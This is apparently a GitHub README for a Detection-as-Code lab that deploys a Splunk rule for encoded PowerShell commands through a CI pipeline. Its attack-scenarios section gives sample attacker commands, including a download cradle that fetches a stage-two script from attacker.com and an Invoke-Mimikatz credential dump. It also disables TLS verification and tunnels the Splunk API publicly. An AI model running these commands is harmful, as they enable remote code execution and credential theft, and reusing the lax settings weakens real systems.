# Detection-as-Code: Automated Splunk Alert Pipeline
![Splunk DaC Pipeline](https://github.com/subhsamal/Detection-as-Code-Lab/actions/workflows/ci-cd.yml/badge.svg)

## 1. Project Overview
This project implements a full **Detection-as-Code (DaC)** lifecycle. It automates the process of defining security detections in YAML, validating them via Python, and deploying them to a containerized Splunk Enterprise instance using the Splunk REST API.

---

## 2. Environment & Workspace Setup
The project was built on an **Intel-based macOS** environment using the following configuration:

* **Project Structure:**
    ```
    detection-as-code-lab/
    ├── .github/
    │   └── workflows/
    │       └── ci-cd.yml               # GitHub Actions CI/CD pipeline
    ├── detections/
    │   └── suspicious_powershell.yml   # YAML-based detection rules
    ├── scripts/
    │   ├── deploy_to_splunk.py         # Deployment automation
    │   └── validate_detections.py      # YAML schema validation
    ├── tests/
    │   ├── cleanup_test.py             # Test data cleanup
    │   ├── ingest_logs_for_detection.py # Test event injection
    │   └── verify_alert.py             # Detection verification
    ├── .gitignore                      # Git ignore rules
    ├── README.md                       # Project documentation
    └── requirements.txt                # Python dependencies
    ```
* **Dependency Management:** Used `pip` to install `PyYAML` for parsing and `splunk-sdk` for SIEM interaction.
* **Infrastructure:** **Docker Desktop** was used to host Splunk, with manual resource allocation tuned to **4GB RAM** to ensure service stability.

---

## 3. Phase 1: Detection Engineering (YAML)
I authored a Splunk detection rule for **Suspicious PowerShell Encoded Commands**. By using YAML, I separated the detection logic from the platform, making the rule portable and version-controllable.

* **File:** `detections/suspicious_powershell.yml`
* **Logic:** Detects the use of `-EncodedCommand` or `-e` flags in PowerShell, a common technique for obfuscating malicious scripts.

---

## 4. Phase 2: Automated Validation
To prevent "broken" rules from reaching production, we implemented a **CI (Continuous Integration)** check.

* **Script:** `validate_detection.py`
* **Function:** This script programmatically verifies that the YAML follows the required schema, checking for mandatory fields like `name`, `search`, and `cron_schedule`.

---

## 5. Phase 3: SIEM Orchestration (Docker)
I deployed Splunk Enterprise using Docker. This stage involved overcoming two critical technical hurdles:

1. **Shell Syntax & Quoting:** Resolved a `dquote>` hanging prompt caused by the Zsh terminal misinterpreting the `!` character in the Splunk password. Fixed by using **single quotes** (`' '`) to encapsulate environment variables.
2. **License Compliance:** Addressed a container crash issue by identifying and adding the `SPLUNK_GENERAL_TERMS` flag, a mandatory requirement for starting modern Splunk Docker images.

**Final Deployment Command:**
```bash
docker run -d -p 8000:8000 -p 8089:8089 \
  -e 'SPLUNK_GENERAL_TERMS=--accept-sgt-current-at-splunk-com' \
  -e 'SPLUNK_START_ARGS=--accept-license' \
  -e 'SPLUNK_PASSWORD=YourSecurePassword123!' \
  --name splunk_lab \
  splunk/splunk:latest
```

**Note:** Replace `YourSecurePassword123!` with a strong password of your choice. The password must be at least 8 characters and meet Splunk's complexity requirements.

---

## 6. Phase 4: Programmatic Code Push
The final stage used the Splunk SDK for Python to bridge the gap between local code and the live SIEM.

* **Script:** `deploy_to_splunk.py`
* **Key Library:** `splunk-sdk` (installed via pip).
* **Mechanism:**
   * **Parsing:** The script reads the validated YAML file from the `detections/` folder.
   * **Connectivity:** Establishes a secure connection to the Splunk Management API via port 8089.
   * **Idempotency:** The script checks if the search already exists. If found, it deletes the old version to perform an update; otherwise, it creates a new "Saved Search."
   * **Deployment:** It pushes the specific search query and cron schedule defined in the YAML directly into the Splunk engine.

### Testing & Validation Scripts

The project separates validation scripts from testing scripts for clear organization:

**Validation (scripts/):**
- `validate_detections.py` - Validates YAML structure and required fields; runs in CI/CD pipeline

**Testing (tests/):**

| Script | Purpose | When to Use |
|--------|---------|-------------|
| `ingest_logs_for_detection.py` | Injects synthetic security events into Splunk | To test detection logic with known malicious and benign scenarios |
| `verify_alert.py` | Queries Splunk to confirm detection fired correctly | After ingesting test events; validates true/false positives |
| `cleanup_test.py` | Removes test events from Splunk index | After testing is complete; maintains clean lab environment |

**Typical Testing Workflow:**
1. Run `scripts/validate_detections.py` to ensure detection syntax is correct
2. Deploy detection with `scripts/deploy_to_splunk.py`
3. Inject test data using `tests/ingest_logs_for_detection.py`
4. Verify results with `tests/verify_alert.py`
5. Clean up with `tests/cleanup_test.py`

For complete implementation details, see the repository.

---

## 7. Detection Logic: PowerShell Encoded Commands

### Core Detection Query

```spl
index=windows sourcetype=WinEventLog:Security EventCode=4688
| search (CommandLine="*powershell*" OR CommandLine="*pwsh*")
| search (CommandLine="*-enc*" OR CommandLine="*-encodedcommand*")
| rex field=CommandLine "-enc(?:odedcommand)?\s+(?<encoded_cmd>\S+)"
| where isnotnull(encoded_cmd) AND len(encoded_cmd) >= 20
| eval decoded_cmd=base64decode(encoded_cmd)
| where isnotnull(decoded_cmd)
| table _time, Computer, User, ParentProcessName, CommandLine, decoded_cmd
| sort -_time
```

**Note:** This is the base detection logic. For production use with exclusions for legitimate sources (SCCM, WinRM, Group Policy, etc.), see the full detection YAML in the repository.

### Attack Scenarios

**Scenario 1: Phishing → Initial Access**
```
User opens malicious document → Macro executes → Spawns PowerShell
Command: powershell.exe -w hidden -enc <base64_payload>
Decoded: IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/stage2.ps1')
```
The attacker downloads a second-stage payload directly into memory, leaving no files on disk.

**Scenario 2: Credential Dumping**
```
Attacker gains foothold → Escalates privileges → Runs Mimikatz
Command: powershell.exe -nop -enc <encoded_mimikatz>
Decoded: Invoke-Mimikatz -DumpCreds
```
Extracts passwords from LSASS memory to move laterally across the network.

**Scenario 3: Persistence via Scheduled Task**
```
Attacker creates scheduled task → Runs daily at 2 AM
Command: powershell.exe -enc <base64_backdoor>
Decoded: Connect back to C2 server, execute commands, maintain access
```
Maintains long-term access through automated callback mechanism.

### Why This Detection Matters

**Visibility:** PowerShell's `-EncodedCommand` flag automatically decodes and executes Base64 strings, making malicious intent invisible at first glance. This detection decodes the content in real-time, exposing what attackers are actually running.

**Coverage:** Catches common attack techniques including:
- Fileless malware (executes entirely in memory)
- Credential theft (Mimikatz, password dumping)
- Command and control (C2) communication
- Lateral movement scripts
- Persistence mechanisms

**Evasion Prevention:** Attackers use encoding to bypass:
- Simple string-based detections (e.g., searching for "DownloadString")
- Antivirus signatures
- Email gateway filters
- Web proxy URL blocking

By validating and decoding the Base64 content, this detection sees through the obfuscation layer and identifies malicious patterns that would otherwise remain hidden.

---

## 7. Local Lab Connectivity (Pinggy)

Since this lab uses a local Splunk instance, I utilize an SSH reverse tunnel via **Pinggy.io** to allow GitHub Actions to securely communicate with the Splunk Management API.

### 1. Prerequisites
- **Docker**: Splunk must be running in a container with port 8089 mapped.
- **SSH**: Standard macOS/Linux terminal access.

### 2. Establishing the Tunnel
To start the tunnel, run the following command on your local host:

```bash
ssh -p 443 -R0:localhost:8089 tcp@a.pinggy.io
```

### 3. Required GitHub Secrets
Every time the tunnel is restarted, the Host and Port will change. You must update these in your **GitHub Repository Settings > Secrets and variables > Actions**:

| Secret Name | Description | Example Value |
|-------------|-------------|---------------|
| `SPLUNK_HOST` | The URL provided by Pinggy | `ltgxl-174-17-125-88.a.free.pinggy.link` |
| `SPLUNK_PORT` | The 5-digit port provided by Pinggy | `54321` |
| `SPLUNK_PASSWORD` | Your local Splunk admin password | `<your-secure-password>` |

### 4. Security & Cleanup
- **Ephemeral Links**: The Pinggy URL is temporary and expires when the SSH session is closed.
- **SSL Verification**: The CI/CD script is configured with `verify=False` to bypass SSL warnings caused by Splunk's default self-signed certificates.
- **Revocation**: This method does not require persistent OAuth access or credit card verification.

### Why use Pinggy for this Lab?
- **No Credit Card Required**: Unlike ngrok, Pinggy allows TCP tunneling on their free tier without identity verification.
- **No Installation**: Uses native OpenSSH already built into the OS.
- **Portability**: Allows the CI/CD pipeline to follow you even if your local IP address changes.